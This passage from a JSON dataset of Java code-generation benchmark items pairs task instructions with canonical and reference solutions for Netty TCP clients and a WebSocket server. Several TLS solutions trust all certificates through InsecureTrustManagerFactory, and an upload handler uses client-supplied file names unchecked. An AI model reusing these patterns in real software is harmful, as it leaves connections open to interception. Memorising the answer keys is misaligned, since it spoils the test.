throws Exception {\n                        channel.pipeline().addLast(new HttpClientCodec());\n                        channel.pipeline().addLast(new HttpContentDecompressor());\n                    }\n                });\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) throws InterruptedException {\n        String host = dockerClientConfig.getDockerHost().getHost();\n        int port = dockerClientConfig.getDockerHost().getPort();\n\n        if (port == -1) {\n            throw new RuntimeException(\"no port configured for \" + host);\n        }\n\n        final DuplexChannel channel = (DuplexChannel) bootstrap.connect(host, port).sync().channel();\n\n        final SslHandler ssl = initSsl(dockerClientConfig);\n\n        if (ssl != null) {\n            channel.pipeline().addFirst(ssl);\n            ssl.sslCloseFuture().addListener(future -> channel.eventLoop().execute(channel::close));\n        }\n\n        return channel;\n    }\n\n    private SslHandler initSsl(DockerClientConfig dockerClientConfig) {\n        SslHandler ssl = null;\n\n        try {\n            String host = dockerClientConfig.getDockerHost().getHost();\n            int port = dockerClientConfig.getDockerHost().getPort();\n\n            final SSLConfig sslConfig = dockerClientConfig.getSSLConfig();\n\n            if (sslConfig != null && sslConfig.getSSLContext() != null) {\n                SSLEngine engine = sslConfig.getSSLContext().createSSLEngine(host, port);\n                engine.setUseClientMode(true);\n                engine.setSSLParameters(enableHostNameVerification(engine.getSSLParameters()));\n                ssl = new SslHandler(engine);\n            }\n\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        return ssl;\n    }\n\n    public SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        return sslParameters;\n    }\n\n    public void close() throws IOException {\n        Objects.requireNonNull(eventLoopGroup, \"Factory not initialized. You probably forgot to call init()!\");\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private <T extends Channel> T configure(T channel) {\n        ChannelConfig channelConfig = channel.config();\n\n        if (connectTimeout != null) {\n            channelConfig.setConnectTimeoutMillis(connectTimeout);\n        }\n        if (readTimeout != null) {\n            channel.pipeline().addLast(\"readTimeoutHandler\", new ReadTimeoutHandler());\n        }\n\n        return channel;\n    }\n\n    private final class ReadTimeoutHandler extends IdleStateHandler {\n        private boolean alreadyTimedOut;\n\n        ReadTimeoutHandler() {\n            super(readTimeout, 0, 0, TimeUnit.MILLISECONDS);\n        }\n\n        @Override\n        protected synchronized void channelIdle(ChannelHandlerContext ctx, IdleStateEvent evt) throws Exception {\n            assert evt.state() == IdleState.READER_IDLE;\n            final Channel channel = ctx.channel();\n            if (channel == null || !channel.isActive() || alreadyTimedOut) {\n                return;\n            }\n            DockerClientConfig dockerClientConfig = getDockerClientConfig();\n            final Object dockerAPIEndpoint = dockerClientConfig.getDockerHost();\n            final String msg = \"Read timed out: No data received within \" + readTimeout\n                    + \"ms.  Perhaps the docker API (\" + dockerAPIEndpoint\n                    + \") is not responding normally, or perhaps you need to increase the readTimeout value.\";\n            final Exception ex = new SocketTimeoutException(msg);\n            ctx.fireExceptionCaught(ex);\n            alreadyTimedOut = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.ReadTimeoutException;\nimport io.netty.handler.timeout.ReadTimeoutHandler;\n\nimport javax.net.ssl.*;\nimport java.io.File;\nimport java.security.KeyStore;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyTcpClient {\n    private final Bootstrap bootstrap = new Bootstrap();\n    private EventLoopGroup eventLoopGroup = new NioEventLoopGroup();\n    private Integer connectTimeout = 3000;\n    private Integer readTimeout = 60000;\n    private String threadPrefix = \"NettyTcpClient-\";\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, connectTimeout)\n                .handler(new ChannelInitializer<>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        configure(ch.pipeline());\n                    }\n                });\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) throws Exception {\n        SslHandler sslHandler = initSsl(dockerClientConfig);\n        ChannelFuture future = bootstrap.connect(dockerClientConfig.getHost(), dockerClientConfig.getPort()).sync();\n\n        if (sslHandler != null) {\n            future.channel().pipeline().addFirst(sslHandler);\n        }\n\n        return new DuplexChannel(future.channel());\n    }\n\n    public SslHandler initSsl(DockerClientConfig dockerClientConfig) throws Exception {\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        keyStore.load(null, null);\n\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        tmf.init(keyStore);\n\n        sslContext.init(null, tmf.getTrustManagers(), null);\n\n        SSLEngine engine = sslContext.createSSLEngine();\n        engine.setUseClientMode(true);\n        SSLParameters sslParameters = engine.getSSLParameters();\n        enableHostNameVerification(sslParameters);\n        engine.setSSLParameters(sslParameters);\n\n        return new SslHandler(engine);\n    }\n\n    public SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        return sslParameters;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private <T extends ChannelPipeline> T configure(T pipeline) {\n        pipeline.addLast(new ReadTimeoutHandler(readTimeout, TimeUnit.MILLISECONDS));\n        pipeline.addLast(new SimpleChannelInboundHandler<ByteBuf>() {\n            @Override\n            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                if (cause instanceof ReadTimeoutException) {\n                    ctx.close();\n                } else {\n                    cause.printStackTrace();\n                }\n            }\n\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n                // Handle incoming data\n            }\n        });\n        return pipeline;\n    }\n\n    public static class DuplexChannel {\n        private final Channel channel;\n\n        public DuplexChannel(Channel channel) {\n            this.channel = channel;\n        }\n\n        public boolean isActive() {\n            return channel.isActive();\n        }\n\n        public void writeAndFlush(ByteBuf message) {\n            channel.writeAndFlush(message);\n        }\n\n        public void close() {\n            channel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 156,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish secure or non-secure connections to a remote server, with capabilities for graceful shutdown.\n\nClass Description: The HttpUploadClient class provides functionality to create and manage a Netty-based TCP client that can connect to a specified host and port, with optional SSL/TLS encryption. It handles connection establishment, channel management, and resource cleanup.\n\nAttributes:\n- host: [String] - The hostname or IP address of the remote server to connect to\n- port: [int] - The port number of the remote server\n- ssl: [boolean] - Flag indicating whether SSL/TLS encryption should be used\n- sslCtx: [SslContext] - Netty's SSL context for secure connections (null if ssl is false)\n- group: [EventLoopGroup] - Netty event loop group for managing I/O operations\n- bootstrap: [Bootstrap] - Netty bootstrap for configuring client connection parameters\n\nMethods:\n- HttpUploadClient(String host, int port, boolean ssl) -> [Constructor] - Initializes the client with connection parameters and SSL configuration if needed\n- connect() -> [Channel] - Establishes a connection to the remote server and returns the communication channel\n- shutdown() -> [void] - Shuts down the client gracefully and releases all resources\n- main(String[] args) -> [void] - Example usage demonstrating client initialization, connection, and shutdown",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.util.internal.SocketUtils;\n\npublic class HttpUploadClient {\n\n    private final String host;\n    private final int port;\n    private final boolean ssl;\n    private final SslContext sslCtx;\n    private final EventLoopGroup group;\n    private final Bootstrap bootstrap;\n\n    public HttpUploadClient(String host, int port, boolean ssl) throws Exception {\n        this.host = host;\n        this.port = port;\n        this.ssl = ssl;\n        \n        if (ssl) {\n            this.sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            this.sslCtx = null;\n        }\n\n        this.group = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new HttpUploadClientInitializer(sslCtx));\n    }\n\n    public Channel connect() throws InterruptedException {\n        ChannelFuture future = bootstrap.connect(SocketUtils.socketAddress(host, port));\n        return future.sync().channel();\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        String host = \"127.0.0.1\";\n        int port = 8080;\n        boolean ssl = false;\n\n        HttpUploadClient client = new HttpUploadClient(host, port, ssl);\n        try {\n            Channel channel = client.connect();\n            // Perform operations with the channel here\n        } finally {\n            client.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class HttpUploadClient {\n    private final String host;\n    private final int port;\n    private final boolean ssl;\n    private SslContext sslCtx;\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n\n    public HttpUploadClient(String host, int port, boolean ssl) {\n        this.host = host;\n        this.port = port;\n        this.ssl = ssl;\n\n        if (ssl) {\n            try {\n                sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                        .build();\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to create SSL context\", e);\n            }\n        }\n    }\n\n    public Channel connect() throws Exception {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        if (ssl) {\n                            ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                        }\n                        // Add custom handlers here for message encoding/decoding and business logic\n                    }\n                });\n\n        ChannelFuture future = bootstrap.connect(host, port).sync();\n        return future.channel();\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        String host = \"example.com\";\n        int port = 80;\n        boolean ssl = false;\n\n        HttpUploadClient client = new HttpUploadClient(host, port, ssl);\n        try {\n            Channel channel = client.connect();\n            System.out.println(\"Connected to server: \" + host + \":\" + port);\n            Thread.sleep(5000); // Simulate some activity\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            client.shutdown();\n            System.out.println(\"Client shutdown complete.\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 157,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: The MyClient class represents a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\n- run: run() -> void - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Periodically sends message objects containing Chinese poetry\n  4. Handles graceful shutdown of network resources\n  5. Throws InterruptedException if interrupted during operation",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"codec\", new MyCodec());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\n\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic class MyClient implements Closeable {\n    private final String host;\n    private final int port;\n    private Channel channel;\n    private ScheduledExecutorService scheduler;\n    private ScheduledFuture<?> future;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8));\n                        }\n                    });\n\n            ChannelFuture connectFuture = bootstrap.connect(host, port).sync();\n            channel = connectFuture.channel();\n\n            scheduler = Executors.newScheduledThreadPool(1);\n            future = scheduler.scheduleAtFixedRate(() -> {\n                if (channel.isActive()) {\n                    String poem = \"\u6625\u7720\u4e0d\u89c9\u6653\uff0c\u5904\u5904\u95fb\u557c\u9e1f\u3002\"; // Example of Chinese poetry\n                    channel.writeAndFlush(Unpooled.copiedBuffer(poem, CharsetUtil.UTF_8));\n                }\n            }, 0, 5, TimeUnit.SECONDS);\n\n            channel.closeFuture().sync();\n        } finally {\n            shutdown();\n            group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        shutdown();\n    }\n\n    private void shutdown() {\n        if (future != null) {\n            future.cancel(true);\n        }\n        if (scheduler != null) {\n            scheduler.shutdownNow();\n        }\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 158,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, handle network communication, and manage resources properly.\n\nClass Description: The TimeClient class represents a Netty-based TCP client that connects to a specified host and port. It manages network connections asynchronously using Netty's event-driven architecture and provides methods to start and stop the client connection.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n- workerGroup: EventLoopGroup - Netty's event loop group for handling I/O operations\n- bootstrap: Bootstrap - Netty's bootstrap for configuring and starting the client\n\nMethods:\n- TimeClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the client connection, configures the pipeline, and connects to the server\n- stop() -> void - Shuts down the client connection gracefully and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n\n    private String host;\n    private int port;\n    private EventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(workerGroup);\n            bootstrap.channel(NioSocketChannel.class);\n            bootstrap.option(ChannelOption.SO_KEEPALIVE, true);\n            bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new TimeClientHandler());\n                }\n            });\n\n            ChannelFuture f = bootstrap.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class TimeClient {\n    private final String host;\n    private final int port;\n    private final EventLoopGroup workerGroup;\n    private final Bootstrap bootstrap;\n\n    public TimeClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n    }\n\n    public void start() {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new TimeClientHandler());\n                    }\n                });\n\n        try {\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 159,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, handle SSL/TLS if required, and process incoming/outgoing messages.\n\nClass Description: DiscardClient is a Netty-based TCP client that connects to a specified server, optionally with SSL/TLS encryption, and handles network communication through a custom handler. The client manages resources efficiently and supports graceful shutdown.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL/TLS encryption should be used\n- HOST: String - The hostname or IP address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server to connect to (default: 8009)\n- SIZE: int - The size parameter for communication (default: 256)\n- sslCtx: SslContext - SSL context for secure connections (nullable)\n\nMethods:\n- main(String[] args) -> void - Entry point that initializes the client, establishes connection, and manages the client lifecycle\n  - args: String[] - Command line arguments (unused in current implementation)\n- initChannel(SocketChannel ch) -> void - Configures the channel pipeline with SSL handler (if enabled) and custom client handler\n  - ch: SocketChannel - The socket channel to be initialized\n- connect() -> ChannelFuture - Establishes connection to the remote server and returns future for connection status\n- shutdown() -> void - Shuts down the client gracefully and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class DiscardClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n    static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                     }\n                     p.addLast(new DiscardClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic class DiscardClient {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n    private static final int SIZE = Integer.parseInt(System.getProperty(\"size\", \"256\"));\n\n    private final SslContext sslCtx;\n\n    public DiscardClient() throws Exception {\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n    }\n\n    public void initChannel(SocketChannel ch) {\n        ChannelPipeline pipeline = ch.pipeline();\n        if (sslCtx != null) {\n            pipeline.addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n        }\n        pipeline.addLast(new DiscardClientHandler());\n    }\n\n    public ChannelFuture connect() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true)\n             .handler(this::initChannel);\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            return f;\n        } catch (Exception e) {\n            group.shutdownGracefully();\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        // Graceful shutdown is handled in the connect method's resource management\n    }\n\n    public static void main(String[] args) throws Exception {\n        final DiscardClient client = new DiscardClient();\n        ChannelFuture future = client.connect();\n        future.channel().closeFuture().addListener(f -> {\n            client.shutdown();\n        });\n    }\n\n    public static final class DiscardClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            byte[] data = new byte[SIZE];\n            ctx.writeAndFlush(Unpooled.wrappedBuffer(data));\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 160,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP server using Netty framework to handle WebSocket connections, manage client protocols, and process various commands and binary messages.\n\nClass Description: LocalServer is a Netty-based TCP server that handles WebSocket connections, manages client protocols, and processes text/binary messages. It maintains a list of active protocols and delegates command execution to connected clients.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - Maintains active client protocols and their associated connections\n- logger: Logger - Logging instance for server events and errors\n\nMethods:\n- LocalServer(int port) -> void - Constructor that initializes the server with specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server with boss/worker groups, configures channel options and handlers, and binds to the specified port\n- LocalServerWebsocketEventImp (inner class) - Handles WebSocket events including connection, disconnection, and message processing\n\nLocalServerWebsocketEventImp Methods:\n- onConnect(ChannelHandlerContext ctx) -> void - Handles new WebSocket connections\n- onDisconnect(ChannelHandlerContext ctx) -> void - Handles client disconnections and cleans up associated protocols\n- onTextMessage(ChannelHandlerContext ctx, String text) -> void - Processes incoming text messages and executes corresponding commands\n- onBinaryMessage(ChannelHandlerContext ctx, byte[] data) -> void - Handles binary file uploads and processes file chunks\n- initLocalClient(ChannelHandlerContext ctx, Command command) -> void - Initializes a new client protocol for device communication\n- executeCommand(ChannelHandlerContext ctx, Command command) -> void - Executes commands on the appropriate protocol instance",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport com.yeetor.androidcontrol.client.LocalClient;\nimport com.yeetor.androidcontrol.message.BinaryMessage;\nimport com.yeetor.androidcontrol.message.FileMessage;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.apache.log4j.Logger;\n\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class LocalServer extends BaseServer {\n    private static Logger logger = Logger.getLogger(LocalServer.class);\n    \n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public LocalServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup).\n                channel(NioServerSocketChannel.class).\n                childOption(ChannelOption.SO_KEEPALIVE, true).\n                childHandler(new ChildChannel(new LocalServerWebsocketEventImp()));\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private class LocalServerWebsocketEventImp extends WebsocketEvent {\n\n        @Override\n        public void onConnect(ChannelHandlerContext ctx) {\n            logger.info(\"Websocket new connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            for (Protocol protocol : protocolList) {\n                if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                    protocol.broswerDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n\n                if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                    protocol.clientDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n            }\n            logger.info(\"Websocket lost connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            Command command = Command.ParseCommand(text);\n            if (command != null) {\n                switch (command.getSchem()) {\n                    case WAIT:\n                        initLocalClient(ctx, command);\n                        break;\n                    case START:\n                    case WAITTING:\n                    case TOUCH:\n                    case KEYEVENT:\n                    case INPUT:\n                    case PUSH:\n                        executeCommand(ctx, command);\n                        break;\n                    case SHOT:\n                        sendShot(ctx, command);\n                        break;\n                    case DEVICES:\n                        sendDevicesJson(ctx);\n                        break;\n                }\n            }\n        }\n\n        @Override\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            int headlen = (data[1] & 0xFF) << 8 | (data[0] & 0xFF);\n            String infoJSON = new String(data, 2, headlen);\n            BinaryMessage message = BinaryMessage.parse(infoJSON);\n\n            if (message.getType().equals(\"file\")) {\n                FileMessage fileMessage = (FileMessage) message;\n                File file = Constant.getTmpFile(fileMessage.name);\n                if (fileMessage.offset == 0 && file.exists()) {\n                    file.delete();\n                }\n                try {\n                    FileOutputStream os = new FileOutputStream(file, true);\n                    byte[] bs = Arrays.copyOfRange(data, 2 + headlen, data.length);\n                    os.write(bs);\n                    os.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                if (fileMessage.offset + fileMessage.packagesize == fileMessage.filesize) {\n                    ctx.channel().writeAndFlush(new TextWebSocketFrame(\"message://upload file success\"));\n                }\n            }\n        }\n\n        void initLocalClient(final ChannelHandlerContext ctx, Command command) {\n            String sn = command.getString(\"sn\", null);\n            String key = command.getString(\"key\", null);\n\n            if (StringUtils.isEmpty(sn)) {\n                AdbDevice iDevice = AdbServer.server().getFirstDevice();\n                if (iDevice == null) {\n                   